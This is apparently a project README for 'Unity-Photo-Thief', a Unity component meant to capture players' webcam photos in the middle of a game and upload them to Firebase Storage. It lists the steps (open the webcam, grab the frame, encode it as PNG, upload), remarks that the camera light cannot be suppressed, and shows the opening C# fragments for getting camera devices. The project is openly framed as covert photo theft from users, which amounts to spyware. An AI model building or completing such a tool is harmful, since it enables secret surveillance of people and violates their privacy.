# Unity-Photo-Thief
In Unity, Capture users' photos in the middle of the game and store them in Firebase Storage. Cannot block the light next to the camera to indicate the working status


# How Does It Work
1-Opens the webcam using the webcam texture class. (See:https://docs.unity3d.com/ScriptReference/WebCamTexture.html)

2-It takes the raw image from the webcam.

3-Assigns values ​​to the Texture2D object. Encodes raw image with Texture2D. 

4-Assigns the byte array to the File Directory converted to png and loads firebase.

# Here are the Codes of the Steps

## Using WebCam
Define the Webcam texture.
```
private WebCamTexture webcamTexture;
```
Get Available Cameras
```
 WebCamDevice[] devices = WebCamTexture.devices;
if (devices.Length == 0)
{
      Debug.Log("Kamera bulunamadı.");
      return;
}
```
